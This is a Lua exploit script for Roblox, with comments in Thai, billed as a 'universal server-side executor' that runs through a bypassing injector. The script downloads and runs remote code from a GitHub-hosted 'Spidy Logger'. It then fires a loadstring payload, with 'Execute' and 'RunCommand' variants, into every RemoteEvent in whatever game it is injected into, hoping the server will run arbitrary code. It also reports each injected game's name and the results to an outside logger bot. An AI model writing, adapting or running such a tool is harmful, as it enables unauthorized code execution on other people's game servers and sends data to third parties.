-- [[ SMILE-X ABSOLUTE: UNIVERSAL SERVER-SIDE EXECUTOR ]]
-- Developer: Pipe (pipe-2467)
-- Status: Identity 8 Required (Bypass Active)

local owner = "pipe-2467"
local repo = "SMILE-X-ABSOLUTE-EDITION"
local HttpService = game:GetService("HttpService")

-- 1. ฟังก์ชันดึงระบบ Spidy Logger จาก GitHub ของนาย
local function LoadLogger()
    local success, result = pcall(function()
        local url = "https://raw.githubusercontent.com/"..owner.."/"..repo.."/main/scripts/spidy_logger.lua"
        return loadstring(game:HttpGet(url))()
    end)
    if success then return result end
    warn("Smile-X: Failed to load Spidy Logger")
    return nil
end

local spidy = LoadLogger()

-- 2. ฟังก์ชันหลักในการรันสคริปต์แบบ Server-Side (รันได้ทุกแมพ)
-- มันจะสแกนหา RemoteEvent ทุกตัวในเกม ไม่ว่าแมพนั้นจะชื่ออะไร
function SmileX_Execute(sourceCode)
    local foundRemotes = 0
    local successRemotes = 0
    
    -- หุ้มโค้ดด้วย loadstring เพื่อส่งไปรันที่ฝั่ง Server
    local payload = "loadstring([[" .. sourceCode .. "]])()"
    
    -- ค้นหาท่อส่งข้อมูลทั้งหมดในแมพ (สแกนทั้ง Workspace, ReplicatedStorage ฯลฯ)
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") then
            foundRemotes = foundRemotes + 1
            
            -- พยายามยิง Payload เข้าไปในท่อ (ใช้ pcall เพื่อไม่ให้สคริปต์หลุดถ้าโดนเตะ)
            local s, _ = pcall(function()
                -- รายชื่อ Argument มาตรฐานที่ Server มักจะเปิดรับ
                v:FireServer(payload)
                v:FireServer("Execute", payload)
                v:FireServer("RunCommand", payload)
            end)
            
            if s then successRemotes = successRemotes + 1 end
        end
    end
    
    -- รายงานผลเข้า Spidy Bot
    if spidy then
        spidy:SendReport(
            "Execution Report", 
            "สแกนเจอทั้งหมด: " .. foundRemotes .. " ท่อ\nยิงสำเร็จ: " .. successRemotes .. " ท่อ", 
            0x00FF80
        )
    end
end

-- 3. ตัวอย่างการใช้งาน (จะรันทันทีที่สคริปต์โหลด)
local initialScript = [[
    print("Smile-X Absolute: Server-Side Active on Map " .. game.PlaceId)
    -- Pipe สามารถใส่สคริปต์เริ่มต้นที่อยากให้รันทุกแมพตรงนี้ได้เลย
]]

-- ยืนยันการโหลดเข้าสู่แมพ
if spidy then
    spidy:SendMessage("Injected into: **" .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. "**")
end

SmileX_Execute(initialScript)

-- 4. ระบบรอรับคำสั่งจาก UI (ถ้า Pipe พิมพ์สคริปต์ใหม่จากหน้าแอป)
-- ส่วนนี้จะรอรับสัญญาณจากตัว Injector ในมือถือของนาย
_G.SmileX_Run = function(newCode)
    SmileX_Execute(newCode)
end

return SmileX_Execute
